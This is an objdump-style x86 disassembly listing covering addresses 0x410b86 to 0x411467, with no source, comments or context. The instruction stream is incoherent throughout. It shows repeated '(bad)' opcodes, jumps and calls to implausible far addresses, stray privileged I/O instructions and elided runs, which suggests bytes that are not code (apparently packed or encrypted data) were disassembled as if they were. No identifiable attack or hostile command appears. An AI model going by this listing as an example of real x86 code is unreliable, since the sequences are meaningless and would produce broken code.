  410b86:	(bad)  
  410b87:	je     0x410b09
  410b89:	push   edi
  410b8a:	(bad)  
  410b8b:	mov    dh,0x8b
  410b8d:	(bad)  [edi]
  410b8f:	rol    DWORD PTR [esi-0x205900df],0xa1
  410b96:	iret   
  410b97:	xchg   esi,eax
  410b98:	dec    ebx
  410b99:	pop    edi
  410b9a:	call   FWORD PTR [eax+eax*4]
  410b9d:	in     eax,dx
  410b9e:	add    cl,ch
  410ba0:	sub    esp,DWORD PTR [edx+0x6d70fcfe]
  410ba6:	imul   edi,DWORD PTR [ebx+ecx*2+0x103cfe5f],0x3b6efe57
  410bb1:	cdq    
  410bb2:	rcr    DWORD PTR [esi+0x3b],cl
  410bb5:	pop    edi
  410bb6:	(bad)  
  410bb7:	aam    0x70
  410bb9:	ins    DWORD PTR es:[edi],dx
  410bba:	mov    edx,DWORD PTR [edx+ecx*1]
  410bbd:	pop    edi
  410bbe:	(bad)  
  410bbf:	aam    0x70
  410bc1:	pusha  
  410bc2:	mov    ah,0x21
  410bc4:	adc    ebx,DWORD PTR [edi-0x2]
  410bc7:	lea    ecx,ds:[eax]
  410bca:	call   0x410bd0
	...
  410bdb:	or     DWORD PTR [edi-0x2],ebx
  410bde:	cs mov ebp,0xfb26f638
  410be4:	addr16 mov al,0xa9
  410be7:	retf   
  410be8:	pop    edi
  410be9:	(bad)  
  410bea:	pop    esp
  410beb:	rcl    BYTE PTR [edi-0x2],1
  410bee:	push   cs
  410bef:	test   al,0xaa
  410bf1:	aas    
  410bf2:	add    BYTE PTR [ebp-0x13],bl
  410bf5:	std    
  410bf6:	mov    ch,0x6e
  410bf8:	aad    0xfd
  410bfa:	jmp    DWORD PTR [edx-0x6f]
  410bfd:	ds (bad) 
  410bff:	cmp    eax,0x5e8b3e8
  410c04:	call   0x49dbf506
  410c09:	std    
  410c0a:	jmp    FWORD PTR ds:0x1df7e296
  410c10:	call   0xe87b91fb
  410c15:	std    
  410c16:	push   DWORD PTR [edi-0x17]
  410c19:	cmc    
  410c1a:	jmp    FWORD PTR [ebp-0x42bf8740]
  410c20:	out    0xfd,eax
  410c22:	mov    ch,0xa6
  410c24:	out    dx,eax
  410c25:	std    
  410c26:	push   edx
  410c28:	aaa    
  410c29:	ds (bad) 
  410c2b:	in     eax,dx
  410c2c:	out    0x43,eax
  410c2e:	clc    
  410c2f:	jecxz  0x410c1b
  410c31:	sti    
  410c32:	(bad)  
  410c33:	fucom  st(7)
  410c35:	jae    0x410c33
  410c37:	shl    BYTE PTR [ecx+0x20ca0010],cl
  410c3d:	ror    DWORD PTR [eax+eax*1],0x0
	...
  410c4d:	add    BYTE PTR [edx+0x39ec8934],bh
  410c53:	(bad)  
  410c56:	mov    bh,BYTE PTR ds:0x5bb7ff4b
  410c5c:	out    0x81,al
  410c5e:	pop    edi
  410c5f:	call   0xe7f89661
  410c64:	std    
  410c65:	jne    0x410cd9
  410c67:	cmp    edx,DWORD PTR [ecx-0xfc34b8]
  410c6d:	xor    eax,0x4100d7
  410c72:	push   edx
  410c73:	mov    bl,bh
  410c75:	(bad)  
  410c76:	jge    0x410c5e
  410c78:	jae    0x410c82
  410c7a:	arpl   WORD PTR [ecx+edx*4-0x25935db9],ax
  410c81:	add    DWORD PTR [ebx+0x6c],esp
  410c84:	and    bh,0xee
  410c87:	popa   
  410c88:	gs (bad) 
  410c8a:	xor    al,0xe2
  410c8c:	data16 (bad) 
  410c8e:	mov    dh,0x64
  410c90:	pop    edx
  410c91:	xchg   ebx,eax
  410c92:	addr16 gs enterw 0x6921,0x2
  410c99:	push   ebp
  410c9a:	call   0x10048de7
  410c9f:	pop    ss
  410ca0:	iret   
  410ca1:	imul   esp,DWORD PTR [ebx-0x4e],0x5476feb5
  410ca8:	pop    edx
  410ca9:	xor    eax,0x88659736
  410cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410caf:	mov    al,0x79
  410cb1:	xor    al,0x0
	...
  410cbf:	add    BYTE PTR [eax],al
  410cc1:	jne    0x410cf7
  410cc3:	ret    
  410cc4:	(bad)  
  410cc5:	jmp    0x2268fd0b
  410cca:	ins    BYTE PTR es:[edi],dx
  410ccb:	cmp    BYTE PTR [esi],0x63
  410cce:	clc    
  410ccf:	shl    BYTE PTR [edi+0x75],0x15
  410cd3:	vunpckhps ymm6,ymm0,YMMWORD PTR [ecx+ebp*8+0x11]
  410cd9:	arpl   WORD PTR [ecx+edi*8-0x41],bp
  410cdd:	aaa    
  410cde:	dec    edi
  410cdf:	int3   
  410ce0:	out    0xc5,eax
  410ce2:	xchg   ebp,eax
  410ce3:	gs (bad) 
  410ce5:	xor    esi,DWORD PTR [edx+eax*1]
  410ce8:	add    BYTE PTR [esi+esi*2-0x52e5c926],al
  410cef:	add    dl,BYTE PTR [eax-0x7c]
  410cf2:	mov    eax,ds:0x48d3e7fa
  410cf7:	dec    BYTE PTR gs:[ebx+0x6cff25d8]
  410cfe:	ret    
  410cff:	add    eax,DWORD PTR [esi-0x1d]
  410d02:	add    eax,0x5bd603e7
  410d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d08:	addr16 xchg ecx,eax
  410d0a:	inc    ebp
  410d0b:	dec    edi
  410d0c:	dec    bp
  410d0e:	pop    esi
  410d0f:	or     eax,0xee1cf671
  410d14:	lock stc 
  410d16:	pop    ebp
  410d17:	jae    0x410d80
  410d19:	xor    eax,0x545be0d8
  410d1e:	and    dh,ch
  410d20:	test   DWORD PTR gs:[edi+0x42af],edi
	...
  410d33:	add    BYTE PTR [eax+0x5],ah
  410d36:	xor    al,0x79
  410d38:	or     BYTE PTR [edx+0x57a68ac],al
  410d3e:	inc    ebx
  410d3f:	mov    ch,0x5
  410d41:	fdiv   st,st(0)
  410d43:	pop    ebx
  410d44:	mov    edx,0xeb65be20
  410d49:	(bad)  
  410d4a:	mov    ah,0xda
  410d4c:	in     al,dx
  410d4d:	in     eax,0x44
  410d4f:	mov    ebx,0xc01105a3
  410d54:	sub    eax,esp
  410d56:	call   0xbff99cbf
  410d5b:	ret    0x65cc
  410d5e:	push   0xf15dc5c2
  410d63:	inc    ebx
  410d64:	xor    ah,bh
  410d66:	sbb    ah,bl
  410d68:	mov    ah,0x5d
  410d6a:	test   DWORD PTR [esi-0x3ce027bc],esp
  410d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d71:	int    0x65
  410d73:	out    dx,eax
  410d74:	fs ins DWORD PTR es:[edi],dx
  410d76:	std    
  410d77:	fist   WORD PTR [ebp+0x4db9405d]
  410d7d:	pop    esi
  410d7e:	dec    ebp
  410d7f:	fadd   QWORD PTR [ebp+ebx*2-0x27fb59ab]
  410d86:	scas   eax,DWORD PTR es:[edi]
  410d87:	ret    0xe574
  410d8a:	inc    esp
  410d8c:	test   eax,0x742dffc4
  410d91:	add    eax,0x5c3cb7e8
  410d96:	(bad)  
  410d97:	push   ds
	...
  410da4:	add    BYTE PTR [eax],al
  410da6:	add    BYTE PTR [ecx+eiz*2-0x2],al
  410daa:	pushf  
  410dab:	dec    eax
  410dac:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410dae:	int    0xbf
  410db0:	pop    ebx
  410db1:	enter  0x632b,0x5
  410db5:	push   ebp
  410db6:	jb     0x410d53
  410db8:	xchg   ebx,eax
  410dba:	cmc    
  410dbb:	push   ds
  410dbc:	mov    ah,0x69
  410dbe:	jmp    0x5d3fdacd
  410dc3:	pop    ds
  410dc4:	gs dec eax
  410dc6:	sbb    eax,0x2c885b7e
  410dcb:	jnp    0x410d5c
  410dcd:	xor    al,0x3f
  410dcf:	addr16 (bad) 
  410dd1:	push   DWORD PTR [ecx+0x45]
  410dd4:	xlat   BYTE PTR ds:[ebx]
  410dd5:	daa    
  410dd6:	sub    BYTE PTR [edi-0x7b],bl
  410dd9:	ds jmp 0x65a8cfdb
  410ddf:	test   eax,0x3f3dffc5
  410de4:	mov    dl,BYTE PTR [eax]
  410de6:	jmp    0x1e011e4b
  410deb:	data16 mov bl,0xe7
  410dee:	pop    eax
  410def:	or     BYTE PTR [esi+edi*8+0x19],bl
  410df3:	lahf   
  410df4:	pop    esp
  410df5:	dec    BYTE PTR [esi+0x208de4fe]
  410dfb:	mov    al,ds:0xb56e4e5c
  410e00:	add    al,0xe8
  410e02:	mov    al,BYTE PTR [ebx+0x4f51fe5b]
  410e08:	sbb    bh,bh
  410e0a:	push   esi
	...
  410e17:	add    BYTE PTR [eax],al
  410e19:	add    BYTE PTR [ebx],ch
  410e1b:	add    eax,0x53e6946
  410e20:	jne    0x410e22
  410e22:	and    BYTE PTR [edx-0x50b5cc06],bl
  410e28:	std    
  410e29:	push   DWORD PTR ds:0x72aef0e1
  410e2f:	pop    ecx
  410e30:	jae    0x410ded
  410e32:	test   DWORD PTR [ebx-0x6],ebp
  410e35:	(bad)  
  410e36:	out    dx,eax
  410e37:	pop    edi
  410e38:	out    0x2b,al
  410e3a:	ss loope 0x410e3a
  410e3d:	pop    edi
  410e3e:	hlt    
  410e3f:	push   ds
  410e40:	rol    DWORD PTR [edx+ecx*2],0x4b
  410e44:	mov    esp,ebp
  410e46:	leave  
  410e47:	sbb    al,0xfb
  410e49:	push   esi
  410e4a:	int    0x3d
  410e4c:	(bad)  
  410e4d:	imul   ecx,ebx,0x320873e0
  410e53:	int3   
  410e54:	cmp    edi,edi
  410e56:	xor    eax,0x81fc438a
  410e5b:	(bad)  
  410e5c:	ins    DWORD PTR es:[edi],dx
  410e5d:	sub    BYTE PTR [ebx],bh
  410e5f:	add    DWORD PTR [ebx+0x4129383d],ecx
  410e65:	add    BYTE PTR [edx+0x3f740028],cl
  410e6b:	imul   ebx,DWORD PTR [eax+0x57013b49],0xfe50dae8
  410e75:	call   ecx
  410e77:	(bad)  
  410e78:	jb     0x410e99
  410e7a:	mov    ecx,gs
  410e7c:	xor    DWORD PTR [eax+0x0],ecx
	...
  410e8b:	add    BYTE PTR [eax],al
  410e8d:	aad    0xe7
  410e8f:	dec    esi
  410e90:	push   0xbeef07ca
  410e95:	push   edx
  410e96:	xchg   ebp,eax
  410e97:	inc    edi
  410e98:	inc    ecx
  410e99:	mov    edx,0xc275fd97
  410e9e:	out    dx,eax
  410e9f:	and    esp,DWORD PTR [ebx+0x5]
  410ea2:	call   0xe8b5608d
  410ea7:	std    
  410ea8:	jmp    0x410f0d
  410eaa:	ins    DWORD PTR es:[edi],dx
  410eab:	enter  0x457f,0x6e
  410eaf:	xlat   BYTE PTR ds:[ebx]
  410eb0:	stc    
  410eb1:	and    eax,0xbac016c2
  410eb6:	sbb    ah,BYTE PTR [ebx-0x2]
  410eb9:	ins    BYTE PTR es:[edi],dx
  410eba:	pop    ds
  410ebb:	mov    dl,0x37
  410ebd:	pop    esp
  410ebe:	xchg   ecx,eax
  410ebf:	popf   
  410ec0:	(bad)  
  410ec1:	(bad)  
  410ec2:	and    BYTE PTR [ebx+0x74],ah
  410ec5:	imul   esi,esp,0xffffffb0
  410ec8:	cmp    cl,BYTE PTR [esp+esi*8-0x3e]
  410ecc:	pop    ebp
  410ecd:	sbb    ch,BYTE PTR [edi]
  410ecf:	or     BYTE PTR [eax],al
  410ed1:	xchg   esi,eax
  410ed2:	xlat   BYTE PTR ds:[ebx]
  410ed3:	outs   dx,DWORD PTR ds:[esi]
  410ed4:	sbb    BYTE PTR [edi],0x59
  410ed7:	in     al,dx
  410ed8:	(bad)  
  410ed9:	mov    edx,0x5b74617e
  410ede:	add    al,0xd3
  410ee0:	cmp    bl,BYTE PTR [esp+eiz*2]
  410ee3:	mov    eax,DWORD PTR [edi+edx*1-0x4b]
  410ee7:	call   0x5b74:0x616ca248
  410eee:	inc    esp
  410eef:	rcr    bh,1
	...
  410efd:	add    BYTE PTR [eax],al
  410eff:	add    ah,bh
  410f01:	inc    ebx
  410f02:	popa   
  410f03:	je     0x410efc
  410f05:	fwait
  410f06:	xlat   BYTE PTR ds:[ebx]
  410f07:	pop    es
  410f08:	sti    
  410f09:	push   ss
  410f0a:	pop    ds
  410f0b:	jmp    esp
  410f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f0e:	inc    esp
  410f0f:	add    esp,DWORD PTR [ebx+0x19]
  410f12:	(bad)  
  410f13:	jmp    0x410ef5
  410f15:	mov    al,ds:0xa53b565e
  410f1a:	cmp    al,0x3f
  410f1c:	arpl   WORD PTR [esp+edx*8+0x0],si
  410f20:	mov    al,ds:0xb7444983
  410f25:	ins    BYTE PTR es:[edi],dx
  410f26:	add    al,BYTE PTR [eax]
  410f28:	arpl   WORD PTR [ebx],dx
  410f2a:	push   edx
  410f2b:	dec    eax
  410f2c:	and    ch,BYTE PTR [ecx+eiz*2+0x74]
  410f30:	imul   eax,DWORD PTR ds:0xce400876,0xffffffa7
  410f37:	add    eax,DWORD PTR [edi]
  410f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f3a:	sbb    BYTE PTR [ebx+eiz*2],al
  410f3d:	add    eax,0x562db69
  410f42:	mov    ebp,0xf0d0740b
  410f47:	imul   edi,DWORD PTR [ecx],0x10
  410f4a:	bound  edi,QWORD PTR ss:[ebx-0x63]
  410f4e:	call   0xc4ae7256
  410f53:	retf   0x5a55
  410f56:	sbb    eax,0x66d64d8
  410f5b:	sbb    al,0x44
  410f5d:	pop    edx
  410f5e:	dec    ecx
  410f5f:	add    ch,BYTE PTR [eax+0xe7e8c4]
	...
  410f71:	add    BYTE PTR [eax],al
  410f73:	xor    eax,0x6303e910
  410f78:	add    eax,0x5ac04762
  410f7d:	mov    bl,0x3
  410f7f:	arpl   WORD PTR ds:0xeda4b6e9,ax
  410f85:	cmp    DWORD PTR ds:0xc241054c,0x29
  410f8c:	(bad)
  410f8f:	or     BYTE PTR [ebx+ecx*1-0x16fa9cfc],0x60
  410f97:	ja     0x410fa6
  410f99:	mov    dh,0xf9
  410f9b:	jecxz  0x410fb6
  410f9d:	add    al,ah
  410f9f:	pushf  
  410fa0:	add    eax,0x5ce0011d
  410fa5:	clc    
  410fa6:	xlat   BYTE PTR ds:[ebx]
  410fa7:	pop    ebx
  410fa8:	inc    edx
  410fa9:	sub    esp,DWORD PTR [eax+0x63]
  410fac:	add    eax,0xf3c803e9
  410fb1:	test   DWORD PTR [edi],edx
  410fb3:	push   esp
  410fb4:	into   
  410fb5:	daa    
  410fb6:	add    al,0xac
  410fb8:	str    edx
  410fbb:	xchg   edi,eax
  410fbc:	(bad)  
  410fbd:	inc    DWORD PTR [eax+0x66ff12de]
  410fc3:	fiadd  WORD PTR [ebp+0x17]
  410fc6:	push   edx
  410fc7:	call   0xbb0:0xd6458ab0
  410fce:	bound  esp,QWORD PTR [ecx+ecx*1-0x75974401]
  410fd5:	jg     0x410f58
	...
  410fe3:	add    BYTE PTR [eax],al
  410fe5:	add    BYTE PTR [edi+0x5],ah
  410fe8:	add    BYTE PTR [esi],dh
  410fea:	lea    ecx,ds:0x58ab698f
  410ff0:	(bad)  
  410ff1:	jmp    0x6e50e6b9
  410ff6:	out    0x94,eax
  410ff8:	(bad)  
  410ff9:	call   0xca7d945e
  410ffe:	das    
  410fff:	(bad)  
  411000:	(bad)  
  411001:	call   0xb5400612
  411006:	arpl   sp,cx
  411008:	inc    eax
  411009:	jmp    0xa26421d1
  41100e:	and    DWORD PTR [ecx-0x1a],ebx
  411011:	add    DWORD PTR [edx+0x58],edi
  411014:	(bad)  
  411015:	mov    eax,ds:0xe9000560
  41101a:	lds    eax,FWORD PTR [esi+0x23]
  41101d:	jmp    0xe9459826
  411022:	pusha  
  411023:	add    eax,0x49b6a00
  411028:	xor    esi,0x60
  41102b:	or     BYTE PTR [ebp-0x1a8bc12],al
  411031:	jb     0x410fd0
  411033:	pop    esp
  411034:	pop    esi
  411035:	mov    al,0x26
  411037:	add    al,0x0
  411039:	aas    
  41103a:	mov    bh,0x4b
  41103c:	fisubr DWORD PTR [ecx]
  41103e:	addr16 pop ebp
  411040:	jno    0x411042
  411042:	retf   
  411043:	sar    ebp,0x8b
  411046:	repz sub esi,esi
  411049:	mov    eax,DWORD PTR [eax]
	...
  411057:	add    BYTE PTR [eax],al
  411059:	add    ebp,DWORD PTR [ebp+0x7e]
  41105c:	test   al,0xb8
  41105e:	add    ecx,DWORD PTR [ebx-0x38766337]
  411064:	jmp    0x4110c8
  411066:	mov    al,bh
  411068:	add    esi,DWORD PTR [ecx+ecx*4]
  41106b:	(bad)  
  41106c:	push   eax
  41106d:	add    ebx,ecx
  41106f:	out    0xa7,al
  411071:	ins    BYTE PTR es:[edi],dx
  411072:	add    al,0x0
  411074:	mov    esi,DWORD PTR [ebx]
  411076:	pushf  
  411077:	mov    ecx,ecx
  411079:	jns    0x41103d
  41107b:	mov    ecx,ecx
  41107d:	cld    
  41107e:	or     dh,dh
  411080:	jne    0x4110e8
  411082:	inc    esi
  411083:	rcl    DWORD PTR [ebp-0x2f],0xe8
  411087:	data16 or BYTE PTR [esi-0x270801bc],cl
  41108e:	add    al,bl
  411090:	push   DWORD PTR [ecx+0x7a0b063f]
  411096:	xor    BYTE PTR [edx],cl
  411098:	jmp    0x4110d1
  41109a:	out    0x6,al
  41109c:	inc    BYTE PTR [edx]
  41109e:	inc    esp
  41109f:	jle    0x4110d9
  4110a1:	or     bh,BYTE PTR ds:0xcb8c9f4
  4110a7:	add    BYTE PTR [ebp-0x7f],dl
  4110aa:	aad    0x81
  4110ac:	les    edx,FWORD PTR [esi]
  4110ae:	xchg   esp,eax
  4110af:	data16 xor BYTE PTR [esi+0x28f7fe40],bh
  4110b6:	add    al,bl
  4110b8:	push   DWORD PTR [ebp+0xf24d]
	...
  4110ca:	add    BYTE PTR [eax],al
  4110cc:	retf   0x3
  4110cf:	sub    esp,DWORD PTR [ecx-0x7503bc8b]
  4110d5:	mov    eax,0x86630873
  4110da:	js     0x4110e9
  4110dc:	arpl   WORD PTR [esi-0x79],bp
  4110df:	mov    edi,0x745d993b
  4110e4:	pop    ebx
  4110e5:	jbe    0x41110f
  4110e7:	xor    al,0xa4
  4110e9:	into   
  4110ea:	mov    WORD PTR [ebx+ebx*4+0x2d],es
  4110ee:	mov    ah,0xe7
  4110f0:	pop    es
  4110f1:	and    bl,BYTE PTR [edi-0x2]
  4110f4:	fisub  DWORD PTR [eax-0x4df101aa]
  4110fa:	imul   edx,DWORD PTR [ebx+0x6e],0x6e
  4110fe:	add    cl,BYTE PTR [ebx]
  411100:	mov    ds:0xf6fef699,eax
  411105:	lds    ebx,FWORD PTR [esi+0x74]
  411108:	outs   dx,DWORD PTR ds:[esi]
  411109:	jge    0x411175
  41110b:	xchg   DWORD PTR [edi-0x3101a0d9],ebx
  411111:	and    BYTE PTR [ecx+eax*2+0x5e],ch
  411115:	ins    BYTE PTR es:[edi],dx
  411116:	add    bh,bh
  411118:	into   
  411119:	fs push 0xfffffff3
  41111c:	jbe    0x411125
  41111e:	pop    edi
  41111f:	xor    BYTE PTR [esi+0x4d740258],0x74
  411126:	sbb    DWORD PTR [ebx-0x5e],ecx
  411129:	ins    BYTE PTR es:[edi],dx
  41112a:	pop    ebp
  41112b:	je     0x411144
  41112d:	add    eax,0xd93
	...
  41113e:	add    BYTE PTR [ebx+0x6c],ah
  411141:	or     eax,eax
  411143:	xchg   edi,eax
  411144:	popa   
  411145:	cdq    
  411146:	add    BYTE PTR [ebx+0x6c],ah
  411149:	add    bh,bh
  41114b:	jbe    0x41117d
  41114d:	push   0x5
  41114f:	aaa    
  411150:	aas    
  411151:	pop    ebp
  411152:	mov    ah,BYTE PTR [eax]
  411154:	and    al,0x4d
  411156:	rcr    DWORD PTR [edi+0x6c],0xb7
  41115a:	mov    cl,bh
  41115c:	les    ebx,FWORD PTR [ebp-0x16fadc25]
  411162:	pop    ebx
  411163:	push   edx
  411164:	add    al,0xaa
  411166:	pop    esi
  411167:	(bad)
  41116a:	imul   ecx,DWORD PTR [edi+0x4a5e8e0f],0xd
  411171:	adc    DWORD PTR [ecx],esp
  411173:	jnp    0x411139
  411175:	call   0x814e40d8
  41117a:	fcom   QWORD PTR [esi+edx*2+0x6d]
  41117e:	jmp    0x2c07fedf
  411183:	and    al,BYTE PTR ds:0x6d5cd85e
  411189:	ret    0x7c1b
  41118c:	push   esi
  41118d:	dec    ebp
  41118e:	fcomp  DWORD PTR [ebp+ebp*2+0x34]
  411192:	pusha  
  411193:	ins    DWORD PTR es:[edi],dx
  411194:	push   esi
  411195:	add    BYTE PTR [ebx+eiz*2],0x5
  411199:	jmp    0xe94233ea
  41119e:	mov    eax,0x476968e9
	...
  4111af:	add    BYTE PTR [eax],al
  4111b1:	add    BYTE PTR [ebp+ebp*8-0x1d],dl
  4111b5:	inc    eax
  4111b6:	test   BYTE PTR ds:0x4263d111,al
  4111bc:	or     eax,0x609af5e
  4111c1:	fsub   DWORD PTR [ebp+ebp*2+0x78]
  4111c5:	sbb    DWORD PTR [esi+edx*2],esp
  4111c8:	sub    eax,0xe90418c8
  4111cd:	add    esp,DWORD PTR [ebx-0x78]
  4111d0:	sub    ebx,DWORD PTR [esp+ebx*4-0x13]
  4111d4:	or     eax,0xc105a3c9
  4111d9:	dec    edx
  4111da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111db:	push   esi
  4111dc:	int    0x9
  4111de:	and    edx,ecx
  4111e0:	or     dh,BYTE PTR [ecx+eiz*8+0x6ff4c0d7]
  4111e7:	out    dx,eax
  4111e8:	inc    DWORD PTR [edx-0x29]
  4111eb:	(bad)  
  4111ee:	jae    0x41125d
  4111f0:	fnclex 
  4111f2:	das    
  4111f3:	push   edi
  4111f4:	or     ch,BYTE PTR [ecx+0x2cc6feab]
  4111fa:	inc    ebx
  4111fb:	push   esi
  4111fc:	(bad)  
  4111fd:	jmp    0xc2a57f62
  411202:	xorps  xmm1,XMMWORD PTR [edx-0x3eb2bcdc]
  411209:	loope  0x41126b
  41120b:	mov    al,0x8a
  41120d:	jge    0x4111e1
  41120f:	fstp   QWORD PTR [edi+0x44]
  411212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411213:	push   ebp
  411214:	neg    bl
	...
  411222:	add    BYTE PTR [eax],al
  411224:	add    BYTE PTR [ecx+0x42],ah
  411227:	inc    BYTE PTR [edx]
  411229:	cmp    dl,BYTE PTR [edi+0x74]
  41122c:	loope  0x411236
  41122e:	mov    edi,0xb0e46fe
  411233:	shr    dh,0xdc
  411236:	outs   dx,DWORD PTR ds:[esi]
  411237:	(bad)  
  411238:	call   0xe1b5669d
  41123d:	enter  0x3150,0x26
  411241:	scas   al,BYTE PTR es:[edi]
  411242:	(bad)  
  411243:	mov    edi,0x895e5d94
  411248:	jmp    0x954017ad
  41124d:	fs push esp
  41124f:	je     0x411242
  411251:	mov    eax,0x87fefeeb
  411256:	push   ebx
  411257:	je     0x41123a
  411259:	mov    BYTE PTR [ebx],bl
  41125b:	cmp    ch,dh
  41125d:	mov    bh,0xff
  41125f:	mov    edi,0x7060615c
  411264:	fisubr WORD PTR ds:0x58a0e80d
  41126a:	push   esp
  41126b:	(bad)  
  41126c:	loop   0x41120e
  41126e:	fld    DWORD PTR [ecx]
  411270:	add    BYTE PTR [ecx],dl
  411272:	data16 std 
  411274:	jne    0x411268
  411276:	loopne 0x411297
  411278:	cmp    DWORD PTR ds:0x8fc009b2,edx
  41127e:	pop    es
  41127f:	jmp    0x4112d6
  411281:	jb     0x41121e
  411283:	and    eax,0x73b1ba41
  411288:	or     BYTE PTR [eax],al
	...
  411296:	add    BYTE PTR [eax],al
  411298:	loop   0x411228
  41129a:	cmp    bh,bh
  41129c:	in     eax,0xfd
  41129e:	mov    edi,0x40ddb875
  4112a3:	jmp    FWORD PTR [edi-0x2d651800]
  4112a9:	mov    cl,0xfd
  4112ab:	or     ecx,edx
  4112ad:	cmp    eax,DWORD PTR [eax]
  4112af:	jmp    0x41131f
  4112b1:	mov    dl,0x73
  4112b3:	or     BYTE PTR [edx],dh
  4112b5:	mov    dh,0x36
  4112b7:	call   DWORD PTR ds:0x8875bffd
  4112bd:	frstor [edi+edi*8]
  4112c0:	scas   eax,DWORD PTR es:[edi]
  4112c1:	add    al,ch
  4112c3:	xchg   DWORD PTR [eax-0x4f],ebp
  4112c6:	std    
  4112c7:	adc    DWORD PTR [edx+0x61027728],0xffffffc9
  4112ce:	or     eax,eax
  4112d0:	out    dx,al
  4112d1:	push   esp
  4112d2:	cmp    eax,DWORD PTR [eax]
  4112d4:	cmp    bl,BYTE PTR [eax-0x2]
  4112d7:	jb     0x41131f
  4112d9:	ins    DWORD PTR es:[edi],dx
  4112da:	(bad)  
  4112db:	dec    DWORD PTR [edx+0x8]
  4112de:	jmp    0x4112e5
  4112e0:	mov    eax,ds:0x3a000005
  4112e5:	jge    0x4112a8
  4112e7:	pop    ebx
  4112e8:	inc    ebx
  4112e9:	mov    BYTE PTR [esi],0x0
  4112ec:	out    dx,eax
  4112ed:	jl     0x4112d9
  4112ef:	push   0x3f0f5b
  4112f4:	add    bh,BYTE PTR [ebx]
  4112f6:	inc    edx
  4112f8:	arpl   WORD PTR [ebx],di
  4112fa:	pop    edx
  4112fb:	je     0x4112fd
	...
  411309:	add    BYTE PTR [eax],al
  41130b:	addr16 inc ebx
  41130d:	rol    BYTE PTR [edi],1
  41130f:	sti    
  411310:	add    ebx,DWORD PTR [ebx-0x2]
  411313:	in     al,0x56
  411315:	inc    edx
  411316:	je     0x411391
  411318:	fwait
  411319:	ror    BYTE PTR [ebx],1
  41131b:	aam    0x18
  41131d:	or     al,0xe8
  41131f:	je     0x4112cc
  411321:	pop    edx
  411322:	(bad)  
  411323:	pop    eax
  411324:	sahf   
  411325:	ror    BYTE PTR [edx],1
  411327:	mov    esp,0x2eff07f0
  41132c:	pushw  0x7
  41132f:	lods   al,BYTE PTR ds:[esi]
  411330:	mov    bl,BYTE PTR [edx-0x38]
  411333:	mov    eax,ds:0xe8550255
  411338:	mov    DWORD PTR [esi-0x4d11803d],eax
  41133e:	addr16 add ecx,esp
  411341:	ret    
  411342:	dec    DWORD PTR [edi+ebp*1+0x67cc303]
  411349:	aas    
  41134a:	out    0xa1,eax
  41134c:	xchg   esi,eax
  41134d:	pop    ecx
  41134e:	(bad)  
  41134f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411350:	mov    al,ds:0x5d64ff66
  411355:	add    cl,BYTE PTR [ebp-0x184c375a]
  41135b:	jmp    0x66a9:0xe0fe594d
  411362:	dec    edi
  411364:	add    al,0x89
  411366:	inc    esp
  411367:	dec    edi
  411368:	lea    ebp,[edx+0x79]
  41136b:	jb     0x411370
  41136d:	pop    ebx
  41136e:	add    BYTE PTR [eax],0x0
	...
  41137d:	add    BYTE PTR [esi+0x5a7503f8],ch
  411383:	loope  0x411345
  411385:	jmp    0x41133a
  411387:	add    al,0xef
  411389:	xor    BYTE PTR [esp+eiz*2],dl
  41138c:	test   DWORD PTR [edi+edi*8+0x5],edi
  411390:	jmp    0xe8c4f29f
  411395:	add    esp,DWORD PTR [ebx-0x80]
  411398:	sub    edx,DWORD PTR [esp+eiz*4+0x52]
  41139c:	push   ebx
  41139d:	push   0x5ac5dd04
  4113a2:	in     eax,0x86
  4113a4:	rol    BYTE PTR [esi+edx*2],0xd0
  4113a8:	jne    0x41138f
  4113aa:	jge    0x411370
  4113ac:	call   0x2b8b3f1f
  4113b1:	pusha  
  4113b2:	pop    edx
  4113b3:	add    eax,0xc8a403e9
  4113b8:	add    BYTE PTR [ebx],0x63
  4113bb:	add    eax,0x5d2788e9
  4113c0:	sbb    BYTE PTR [ebx+0x2f],bl
  4113c3:	popa   
  4113c4:	adc    eax,0x75af916c
  4113c9:	pop    edx
  4113ca:	imul   eax,DWORD PTR [ebp-0xc],0x50d0e1f3
  4113d1:	add    ecx,DWORD PTR [edi]
  4113d3:	call   FWORD PTR [ebp-0x30]
  4113d6:	test   BYTE PTR [ebp+0x11],bl
  4113d9:	pop    ecx
  4113da:	jne    0x41142e
  4113dc:	popa   
  4113dd:	cmp    ebp,DWORD PTR [ebp-0x28]
  4113e0:	push   eax
  4113e1:	imul   eax,DWORD PTR [eax],0x0
	...
  4113f0:	add    BYTE PTR ds:0x695a3e14,dh
  4113f6:	cs mov ebx,0x44cfe1f0
  4113fc:	add    edx,edi
  4113fe:	add    ah,BYTE PTR [esi]
  411400:	enter  0xdd40,0x70
  411404:	idiv   BYTE PTR [edx+edx*2]
  411407:	add    BYTE PTR [esi+0x69],dh
  41140a:	add    eax,0x5df56ee9
  41140f:	out    0xc2,eax
  411411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411412:	adc    ch,cl
  411414:	rcr    BYTE PTR [edx],1
  411416:	retf   0x68ff
  411419:	jns    0x411420
  41141b:	je     0x411402
  41141d:	pop    ebp
  41141e:	cs jae 0x4113a8
  411421:	push   esi
  411422:	cs jae 0x41141e
  411425:	push   cs
  411426:	add    cl,BYTE PTR [ebp+0x67c28f2c]
  41142c:	(bad)  
  41142d:	pop    ds
  41142e:	vaddsubps ymm6,ymm0,YMMWORD PTR [edi+0x3abefec8]
  411436:	fldpi  
  411438:	rol    DWORD PTR [edi+0x22],0xff
  41143c:	scas   al,BYTE PTR es:[edi]
  41143d:	fiadd  WORD PTR [esi+0x5e]
  411440:	inc    edx
  411441:	sbb    BYTE PTR [edi+0x54],al
  411444:	jb     0x411491
  411446:	test   ebx,eax
  411448:	dec    ecx
  411449:	sbb    DWORD PTR [ebx-0x2],edx
  41144c:	ss icebp 
  41144e:	jmp    0x51e0baa2
  411453:	idiv   bl
	...
  411461:	add    BYTE PTR [eax],al
  411463:	add    BYTE PTR [ecx+0x46],ah
  411466:	(bad)  
  411467:	ss out dx,al
